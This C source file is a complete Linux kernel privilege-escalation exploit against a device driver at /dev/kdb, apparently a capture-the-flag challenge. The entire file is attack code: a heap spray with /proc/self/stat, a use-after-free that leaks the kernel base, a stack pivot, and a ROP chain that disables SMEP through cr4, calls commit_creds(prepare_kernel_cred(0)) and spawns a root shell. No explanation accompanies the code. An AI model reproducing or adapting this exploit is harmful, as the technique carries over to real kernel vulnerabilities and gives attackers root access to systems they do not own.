#define _GNU_SOURCE
#include<sched.h>
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>
#include<sys/mman.h>
#include<string.h>
#include<sys/stat.h>
#include<sys/types.h>
#include<fcntl.h>
#include<errno.h>
#include<sys/wait.h>
#include<pthread.h>
#include<sys/syscall.h>
#include<sys/ioctl.h>
#include<linux/userfaultfd.h>
#include <poll.h>
#include <signal.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include<sys/socket.h>
#include<sys/xattr.h>
#include <sys/prctl.h>
#include <assert.h>

#define DEVICE_FILE "/dev/kdb"
#define PAGESIZE 0x1000ul
#define SPRAY_NUM 0x85ul
#define LEAK_OFFSET 0xb1c50ul
#define DESIRED_CR4_VALUE 0x6b0ul

#define ALLOC 0x13371338ul
#define LEAK 0x13371339ul
#define ATTACK 0x1337133aul
#define DELETE 0x1337133dul
#define UAF 0x1337133ful

struct alloc_req{
	char name[0x1f];
	char filler;
	unsigned long size;
} __attribute__((packed));

struct leak_req{
	char name[0x1f];
	char filler;
	char *buf;
	unsigned long field0x28;
} __attribute__((packed));

struct attack_req{
	char name[0x1f];
	char filler;
	char *buf;
	unsigned long field0x28;
} __attribute__((packed));

struct delete_req{
	char name[0x1f];
	char filler;
} __attribute__((packed));

struct uaf_req{
	char name[0x1f];
	char filler;
	char *buf;
	unsigned long field0x28;
} __attribute__((packed));

int fd,tfd;
int spray_fd[SPRAY_NUM];
typedef unsigned long __attribute__((regparm(3)))(*commit_creds_func)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3)))(*prepare_kernel_cred_func)(unsigned long cred);
commit_creds_func commit_creds = (commit_creds_func) 0x03d3a0;
prepare_kernel_cred_func prepare_kernel_cred = (prepare_kernel_cred_func) 0x03d1a0;
unsigned long kernel_leak;
unsigned long kernel_base;
unsigned long pivot=0xe0747;// mov esp, 0xe58948c0; pop rbp; ret;
unsigned long swapgs=0x13e858;// swapgs; ret;
unsigned long poprdi=0x0a23cd;
unsigned long movrdirax=0xe4c79;// mov qword ptr [rdi], rdx; cmp rcx, rsi; mov rdi, rax; ja 0x2e4c6d; pop rbp; ret;
unsigned long poprcx=0x221590;
unsigned long poprsi=0x13c0b;// pop rsi; add cl, cl; ret; 
unsigned long write_cr4=0x8880;//mov cr4, rax; pop rbp; ret;
unsigned long poprax=0x2da84;
unsigned long iretq=0x13e030;

unsigned long poprdx=0x10dc0f;

unsigned long stackpivot=0xe58948c8;
unsigned long stackbase=0xe5893000;

unsigned long filler=0x4141414141414141;

void Read(char *buff,unsigned long count){
	read(fd,buff,count);
}
void alloc(char *name,unsigned long size){
	struct alloc_req req;
	memcpy(req.name,name,0x20);
	req.size=size;
	ioctl(fd,ALLOC,&req);
}
void leak(char *name,char *buf,unsigned long field0x28){
	struct leak_req req;
	memcpy(req.name,name,0x20);
	req.buf=buf;
	req.field0x28=field0x28;
	ioctl(fd,LEAK,&req);
}
void attack(char *name,char *buf,unsigned long field0x28){
	struct attack_req req;
	memcpy(req.name,name,0x20);
	req.buf=buf;
	req.field0x28=field0x28;
	ioctl(fd,ATTACK,&req);
}
void delete(char *name){
	struct delete_req req;
	memcpy(req.name,name,0x20);
	ioctl(fd,DELETE,&req);
}
void uaf(char *name,char *buf,unsigned long field0x28){
	struct uaf_req req;
	memcpy(req.name,name,0x20);
	req.buf=buf;
	req.field0x28=field0x28;
	ioctl(fd,UAF,&req);
}
void set_affinity(int which_cpu)
{
    cpu_set_t cpu_set;
    CPU_ZERO(&cpu_set);
    CPU_SET(which_cpu, &cpu_set);
    if (sched_setaffinity(0, sizeof(cpu_set), &cpu_set) != 0)
    {
        perror("sched_setaffinity()");
        exit(EXIT_FAILURE);
    }
}
void privesc(){
	commit_creds(prepare_kernel_cred(0));
}
unsigned long user_cs,user_ss,user_rflags,user_rsp;
static void save_state()
{
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %3\n"
        "pushfq\n"
        "popq %2\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags), "=r"(user_rsp)
        :
        : "memory");
}
void getshell(){
	if(!getuid()){
		puts("[+] Priv esc successful!");
	}
	puts("[+] Shell1!!!!");
	char *args[]={"/bin/sh",NULL}; 
	execve("/bin/sh",args,NULL);
}

void exploit(){
	set_affinity(0);
	save_state();
	char name[0x1f];
	for(int i=0;i<0x1e;i++){
		name[i]='A';
	}
	name[0x1e]='\x00';
	fd=open(DEVICE_FILE,O_RDWR);
	for(int i=0;i<SPRAY_NUM;i++){
		spray_fd[i]=open("/proc/self/stat",O_RDONLY);
	}
	tfd=open("/proc/self/stat",O_RDONLY);
	close(tfd);
	alloc(name,0x20);
	unsigned long leaks[4];
	leak(name,(char *)leaks,0);
	kernel_leak=leaks[1];
	kernel_base=kernel_leak-LEAK_OFFSET;
	pivot+=kernel_base;
	swapgs+=kernel_base;	
	iretq+=kernel_base;	
	poprdi+=kernel_base;	
	movrdirax+=kernel_base;	
	poprcx+=kernel_base;	
	poprsi+=kernel_base;	
	poprdx+=kernel_base;	
	poprax+=kernel_base;	
	write_cr4+=kernel_base;	
	commit_creds=(commit_creds_func)(kernel_base+(unsigned long)commit_creds);
	prepare_kernel_cred=(prepare_kernel_cred_func)(kernel_base+(unsigned long)prepare_kernel_cred);
	printf("[+] Heap_leak=%p.\n",(void *)leaks[0]);
	printf("[+] Kernel_leak=%p.\n",(void *)kernel_leak);
	printf("[+] Kernel_base=%p.\n",(void *)kernel_base);
	printf("[+] Kernel_pivot=%p.\n",(void *)pivot);
	uaf(name,(char *)kernel_base,0x100);
	tfd=open("/proc/self/stat",O_RDONLY);
	unsigned long payload[4]={pivot,pivot,pivot,pivot};
	attack(name,(char *)payload,0);
	mmap((void *)stackbase,0x6000,PROT_EXEC|PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED,0,0);
	memset((void *)stackbase,0,0x6000);
	unsigned long ropchain[]={poprax,DESIRED_CR4_VALUE,write_cr4,0xdeadbeef,
		privesc,
		swapgs,
		iretq,getshell,user_cs,user_rflags,stackbase+0x4000,user_ss};
	memcpy((void *)stackpivot,ropchain,sizeof(ropchain));
	read(tfd,NULL,0);
}
int main(){
	exploit();
}	
